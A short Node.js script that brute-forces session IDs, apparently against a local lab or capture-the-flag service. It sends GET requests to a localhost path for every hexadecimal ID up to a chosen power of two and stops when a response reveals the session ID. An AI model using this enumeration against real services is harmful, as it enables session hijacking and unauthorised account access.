var XMLHttpRequest = require('xhr2');
var indexMax = Math.pow(2, process.argv[2]);
for(var i = 0;i < indexMax;i++) {
    (function(i) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
          console.log(xhr.response);
    if(xhr.response.includes("Your session ID is actually")) process.exit("Session ID found, stopping of the script.");
    }
  }
        xhr.open('GET', 'http://localhost:8080/'+ process.argv[3] +'?id=' + i.toString(16).toUpperCase());
        xhr.send(null);
    })(i);
}